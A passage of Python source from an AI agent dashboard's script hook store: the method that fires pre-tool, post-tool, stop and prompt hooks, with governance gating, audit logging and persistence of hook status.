        subagent_id: str | None = None,
        parent_session_key: str | None = None,
        agent_role: str | None = None,
        hook_continuation_count: int = 0,
    ) -> list[ScriptHookResult]:
        """Fire all enabled hooks matching the given event. Returns results.

        For PreToolUse/PostToolUse, matcher filters by tool name.
        For AgentSpawn/UserPromptSubmit/Stop, all hooks for that event fire.

        Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
        emitted into the hook_event payload so hook scripts can attribute tool
        calls to the specific agent/session that fired them. Parent contexts
        (dashboard chat, generic LLM helpers) leave them as ``None``.

        For the Stop event, the full ``context`` (the final assistant segment) is
        used for matcher evaluation and echoed to stdin as ``assistant_text``;
        only the ``KIROCREW_HOOK_CONTEXT`` env var is length-capped downstream in
        ``run_script_hook`` (ARG_MAX safety), so a hook keying on the tail of the
        segment reads it from stdin JSON rather than the truncated env var.
        """
        results = []
        # Build base hook event (Kiro CLI format)
        hook_event: dict = {"hook_event_name": event, "cwd": os.getcwd()}
        if event == HOOK_EVENT_USER_PROMPT_SUBMIT and context:
            hook_event["prompt"] = context
        elif event == HOOK_EVENT_STOP:
            # Echo the final assistant segment to stdin so a hook keying on the
            # tail — e.g. the harness [OPTIONS:] line, past the env var's cap —
            # reads the whole thing here rather than the truncated env var.
            # Unconditional (even when "") so an empty/no-output Stop turn still
            # carries the key and a hook that always reads it never KeyErrors.
            hook_event["assistant_text"] = context
            # Advisory self-limiting signals: hook_continuation_count is the depth
            # of the current unbroken continuation run (0 on a normal turn), and
            # stop_hook_active is its boolean shorthand (count > 0). Kiro's Stop
            # contract defines no cap and neither field, so these are additive: a
            # hook may self-limit, diagnose, or surface the count to the model,
            # while a real gate hook checks its own condition and ignores them.
            # Stamped unconditionally so the keys are always present.
            hook_event["hook_continuation_count"] = hook_continuation_count
            hook_event["stop_hook_active"] = hook_continuation_count > 0
        if tool_name:
            hook_event["tool_name"] = tool_name
        if tool_input is not None:
            hook_event["tool_input"] = tool_input
        if tool_response is not None:
            hook_event["tool_response"] = tool_response
        if subagent_id:
            hook_event["subagent_id"] = subagent_id
        if parent_session_key:
            hook_event["parent_session_key"] = parent_session_key
        if agent_role:
            hook_event["agent_role"] = agent_role

        for hook in list(self._hooks.values()):
            if not hook.enabled or hook.event != event:
                continue
            # Matcher filtering: for tool hooks, match tool name; for others, match context
            if hook.matcher:
                if event in (HOOK_EVENT_PRE_TOOL_USE, HOOK_EVENT_POST_TOOL_USE):
                    if not _tool_matches(hook.matcher, tool_name):
                        continue
                elif context:
                    # Offload to a thread: regex mode spawns a bounded subprocess
                    # (_bounded_pattern_search), which must not block the event loop.
                    matched = await asyncio.to_thread(
                        _context_matches, hook.matcher, hook.matcher_mode, context
                    )
                    if not matched:
                        continue
            # Skills-only hooks: inject skill-loading directive without subprocess.
            # Only meaningful for UserPromptSubmit/AgentSpawn — on tool hooks or Stop
            # the synthesized "Load skills:" text has no consumer.
            if (
                hook.skills
                and not hook.command
                and event
                in (
                    HOOK_EVENT_USER_PROMPT_SUBMIT,
                    HOOK_EVENT_AGENT_SPAWN,
                )
            ):
                # Governance: skills-only hooks must respect the same capability
                # gate as command hooks — a disabled capabilities.script_hooks
                # must not be bypassable by omitting the command field.
                sk = parent_session_key or ""
                gov_denied = _script_hooks_capability_denied(sk)
                if gov_denied:
                    hook.last_run = time.time()
                    hook.last_status = "blocked"
                    hook.last_error = f"Blocked by governance: {gov_denied}"
                    hook.run_count += 1
                    _audit_governance_hook_decision(
                        sk, f"skills_only_hook:{hook.name or hook.id}", "denied", gov_denied
                    )
                    logger.info(
                        "Hook %s (%s): skills-only blocked by governance: %s",
                        hook.name,
                        event,
                        gov_denied,
                    )
                    continue
                # Audit the allow decision before proceeding.
                _audit_governance_hook_decision(
                    sk,
                    f"skills_only_hook:{hook.name or hook.id}",
                    "allowed",
                    "skills-only hook permitted",
                )
                skills_directive = " ".join(f"${s.split('/')[-1]}" for s in hook.skills)
                hook.last_run = time.time()
                hook.last_status = "ok"
                hook.last_error = ""
                hook.run_count += 1
                result = ScriptHookResult(
                    hook_id=hook.id,
                    hook_name=hook.name,
                    event=hook.event,
                    stdout=f"Load skills: {skills_directive}",
                    exit_code=0,
                    duration_ms=0,
                )
                results.append(result)
                logger.info(
                    "Hook %s (%s): skills-only injection (%d skills)",
                    hook.name,
                    event,
                    len(hook.skills),
                )
                continue
            result = await run_script_hook(hook, context, hook_event)
            results.append(result)
            logger.info(
                "Hook %s (%s): %s in %dms (exit=%d)",
                hook.name,
                event,
                hook.last_status,
                result.duration_ms,
                result.exit_code,
            )
        # Snapshot INSIDE the worker under the mutex, not here: capturing on the
        # loop and persisting later leaves the same interleaving window a
        # concurrent CRUD mutation could fall into.
        await asyncio.to_thread(self._persist_current)
        return results

    def _persist_current(self) -> None:
        """Persist the live hook set, serialised against CRUD mutations.

        This path only records status bookkeeping after a fire; the hook set
        itself is unchanged. `_save` refuses to write over an unreadable
        `hooks.json` so it cannot destroy the webhook contexts sharing that
        file, but that refusal must not propagate here: `fire()` is awaited
        from the PRE_TOOL_USE path, which turns an exception into a rejected
        tool call, so a corrupt file would block every tool call in dashboard
        chat until an operator repaired it. Log and continue instead. The CRUD
        paths keep failing loud, where losing the write does change the hook set.
        """
        with self._mutex:
            try:
                self._save()
            except (webhooks.WebhookStoreUnreadable, OSError) as exc:
                logger.warning(
                    "Could not persist hook status bookkeeping: %s. "
                    "Hook execution continues; %s needs repair before "
                    "hook edits can be saved.",
                    exc,
                    self._path,
                )

    def _save_snapshot(self, hooks_data: list[dict]) -> None:
        """Thread-safe save using pre-captured hook snapshot."""
        with self._mutex:
            self._write_hooks_file([*hooks_data, *self._unparsed_hook_entries])


# -- Global script hook store accessor --
# Set by dashboard server.py / handlers.py when the store is initialized.
# Allows any module (task_executor, llm_helpers, subagent) to fire script hooks
# without needing a reference to DashboardState.

_global_script_hook_store: ScriptHookStore | None = None


def set_global_hook_store(store: ScriptHookStore) -> None:
    """Register the global script hook store."""
    global _global_script_hook_store
    _global_script_hook_store = store


def get_global_hook_store() -> ScriptHookStore | None:
    """Get the global script hook store, or None if not initialized."""
    return _global_script_hook_store


async def fire_tool_hooks(
    hook_store: ScriptHookStore | None,
    event_title: str,
    event_tool_input: str | None = None,
    subagent_id: str | None = None,
    parent_session_key: str | None = None,
    agent_role: str | None = None,
) -> None:
    """Fire PreToolUse hooks for an EVENT_TOOL_CALL event.

    PostToolUse is NOT fired here because EVENT_TOOL_CALL is a notification
    that the tool is starting - the tool hasn't completed yet. PostToolUse
    should be fired on EVENT_TOOL_RESULT when available.

    Note: For EVENT_TOOL_CALL, hooks are informational only. The tool is
    already running (auto-approved by kiro-cli), so hook results cannot
    block execution. Hook scripts can log, audit, or trigger side effects.

    Optional ``subagent_id``, ``parent_session_key``, and ``agent_role`` are
    forwarded to the underlying hook_store so hook scripts can attribute
    tool calls to the specific agent/session that fired them. Callers in
    parent contexts (dashboard chat, generic LLM helpers) leave them as
    ``None``; subagent and taskrunner callers pass real values.
    """
    if hook_store is None:
        return
    tool_name = event_title or ""
    if tool_name.startswith("Running: "):
        tool_name = tool_name[9:]
    tool_input = None
    if event_tool_input:
        try:
            tool_input = json.loads(event_tool_input)
        except Exception:
            pass
    try:
        await hook_store.fire(
            HOOK_EVENT_PRE_TOOL_USE,
            tool_name=tool_name,
            tool_input=tool_input,
            subagent_id=subagent_id,
            parent_session_key=parent_session_key,
            agent_role=agent_role,
        )
    except Exception:
        logger.debug("PreToolUse hook error", exc_info=True)
